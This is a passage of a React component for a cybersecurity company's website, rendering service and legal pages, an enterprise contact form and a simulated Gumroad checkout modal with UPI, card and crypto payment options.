            onRotateKey={() => setApiKey("cdb_live_key_" + Math.floor(Math.random() * 9000000 + 1000000))}
            onExecuteApi={executeEcosystemApiRequest}
          />
        )}

      </main>

      {/* ===== COMPLIANCE PAGES ===== */}
      {(currentView === "about" || currentView === "privacy" || currentView === "terms" || currentView === "copyright") && (
        <LegalPages
          currentView={currentView as "about" | "privacy" | "terms" | "copyright"}
          onNavigate={setCurrentView}
          onContact={() => setShowContactModal(true)}
        />
      )}

            {/* ===== ENTERPRISE SERVICE PAGES ===== */}
      {(currentView === "soc" || currentView === "dpdp" || currentView === "owasp" || currentView === "mssp" || currentView === "vciso" || currentView === "pentest") && (
        <ServicePages
          currentView={currentView as "soc" | "dpdp" | "owasp" | "mssp" | "vciso" | "pentest"}
          onNavigate={setCurrentView}
          onContact={() => setShowContactModal(true)}
          roiStaff={roiStaff}
          roiEndpoints={roiEndpoints}
          roiBreach={roiBreach}
          onRoiStaffChange={setRoiStaff}
          onRoiEndpointsChange={setRoiEndpoints}
          onRoiBreachChange={setRoiBreach}
        />
      )}

            {/* 5. BOTTOM ECOSYSTEM FOOTER BAR */}
      <Footer onNavigate={setCurrentView} onContactClick={() => setShowContactModal(true)} />

      {/* 6. GENERAL REQUEST ENTRY / LEAD MODAL */}
      {showContactModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm"
          role="dialog"
          aria-modal="true"
          aria-labelledby="contact-modal-title"
          onClick={(e) => { if (e.target === e.currentTarget) setShowContactModal(false); }}
          onKeyDown={(e) => { if (e.key === "Escape") setShowContactModal(false); }}
        >
          <div className="bg-[#0c1117] border border-slate-800 rounded-lg max-w-md w-full overflow-hidden shadow-2xl">
            <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex justify-between items-center">
              <h3 id="contact-modal-title" className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Briefcase className="w-4.5 h-4.5 text-cyan-500" aria-hidden="true" />
                CyberDudeBivash® Enterprise Request
              </h3>
              <button
                onClick={() => setShowContactModal(false)}
                aria-label="Close enterprise request dialog"
                className="text-slate-500 hover:text-slate-300 font-mono text-sm p-1"
              >
                [X]
              </button>
            </div>

            <div className="p-6">
              {contactSubmitted ? (
                <div className="text-center py-6 space-y-3 animate-fade-in">
                  <CheckCircle2 className="w-12 h-12 text-emerald-500 mx-auto animate-bounce" />
                  <h4 className="text-slate-200 font-bold text-sm">Enterprise Inquiry Transmitted</h4>
                  <p className="text-xs text-slate-400 max-w-xs mx-auto font-sans leading-relaxed">
                    A Sentinel Security Coordinator from CyberDudeBivash® (Odisha, India) will review your payload coordinates and reach back via secured email channels.
                  </p>
                </div>
              ) : (
                <form onSubmit={handleContactSubmit} className="space-y-4">
                  <p className="text-xs text-slate-400 leading-normal font-sans">
                    Submit your organization coordinates below to request managed cloud HSM backups, physical SOC tokens, or India DPDP automation services.
                  </p>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Full Name</label>
                    <input 
                      type="text" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.name}
                      onChange={(e) => setContactForm({...contactForm, name: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Secure Business Email</label>
                    <input 
                      type="email" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.email}
                      onChange={(e) => setContactForm({...contactForm, email: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Company / Agency Name</label>
                    <input 
                      type="text" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.company}
                      onChange={(e) => setContactForm({...contactForm, company: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Requirement Overview</label>
                    <textarea 
                      required
                      rows={3}
                      placeholder="E.g. On-premises Sentinel Threat Detection node..."
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500 resize-none font-sans"
                      value={contactForm.message}
                      onChange={(e) => setContactForm({...contactForm, message: e.target.value})}
                    />
                  </div>
                  <button 
                    type="submit"
                    className="w-full bg-cyan-500 hover:bg-cyan-400 text-black py-2.5 rounded font-bold text-xs uppercase tracking-wider mt-2 transition-all cursor-pointer"
                  >
                    Transmit Secured Request
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 7. INTERACTIVE CHECKOUT MODAL (Gumroad simulator) */}
      {checkoutModalOpen && checkingOutProduct && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm"
          role="dialog"
          aria-modal="true"
          aria-labelledby="checkout-modal-title"
          onClick={(e) => { if (e.target === e.currentTarget) setCheckoutModalOpen(false); }}
          onKeyDown={(e) => { if (e.key === "Escape") setCheckoutModalOpen(false); }}
        >
          <div className="bg-[#0c1117] border border-slate-800 rounded-lg max-w-md w-full overflow-hidden shadow-2xl animate-fade-in">
            <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex justify-between items-center">
              <h3 id="checkout-modal-title" className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Download className="w-4 h-4 text-emerald-400" aria-hidden="true" />
                Gumroad Checkout Core
              </h3>
              <button
                onClick={() => setCheckoutModalOpen(false)}
                aria-label="Close checkout dialog"
                className="text-slate-500 hover:text-slate-300 font-mono text-sm p-1"
              >
                [X]
              </button>
            </div>

            <div className="p-6 space-y-4">
              {checkoutSubmitted ? (
                <div className="text-center py-6 space-y-3">
                  <CheckSquare className="w-12 h-12 text-emerald-500 mx-auto animate-bounce" />
                  <h4 className="text-slate-200 font-bold text-sm">Download Ready!</h4>
                  <p className="text-xs text-slate-400 max-w-xs mx-auto leading-relaxed font-sans">
                    Your payment was verified. The package `{checkingOutProduct.title}` has been registered to your profile. Click Download below to save your defense asset.
                  </p>
                  <div className="pt-2">
                    <button 
                      type="button"
                      onClick={() => {
                        setPurchasedProduct(checkingOutProduct.id);
                        setCheckoutModalOpen(false);
                      }}
                      className="bg-emerald-500 hover:bg-emerald-400 text-black font-extrabold text-xs uppercase py-2 px-6 rounded"
                    >
                      Download Asset (.ZIP)
                    </button>
                  </div>
                </div>
              ) : (
                <form onSubmit={handleCheckoutSubmit} className="space-y-4">
                  <div className="bg-slate-950 p-4 rounded border border-slate-900 space-y-1">
                    <span className="text-[9px] font-mono text-slate-500 uppercase">Selected Asset</span>
                    <h4 className="text-xs font-bold text-slate-200">{checkingOutProduct.title}</h4>
                    <div className="text-xs font-bold text-emerald-400 font-mono pt-1">{checkingOutProduct.price}</div>
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] uppercase font-mono text-slate-500">Receipt Email</label>
                    <input 
                      type="email" 
                      required
                      placeholder="you@domain.com"
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] uppercase font-mono text-slate-500">Secure Payment Channel</label>
                    <div className="grid grid-cols-3 gap-2">
                      <button
                        type="button"
                        onClick={() => setPaymentOption("upi")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "upi" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        UPI / GPay
                      </button>
                      <button
                        type="button"
                        onClick={() => setPaymentOption("card")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "card" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        Card / Net
                      </button>
                      <button
                        type="button"
                        onClick={() => setPaymentOption("crypto")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "crypto" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        USDT / Crypto
                      </button>
                    </div>
                  </div>

                  {paymentOption === "upi" && (
                    <div className="bg-slate-950/80 border border-slate-900 rounded p-3 text-center space-y-1.5 font-mono text-[10px]">
                      <div className="text-slate-400">UPI ID: <span className="font-bold text-slate-200">bivash@cyberdudebivash.com</span></div>
                      <div className="text-slate-500">Scan BHIM, PhonePe, Paytm, or GPay QR code at checkout to process instantly.</div>
                    </div>
                  )}

                  <button 
                    type="submit"
                    className="w-full bg-emerald-500 hover:bg-emerald-400 text-black py-2.5 rounded font-extrabold text-xs uppercase tracking-wider transition-all"
                  >
                    Confirm Secure Payment
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}

      <CookieConsent />
    </div>
  );
}
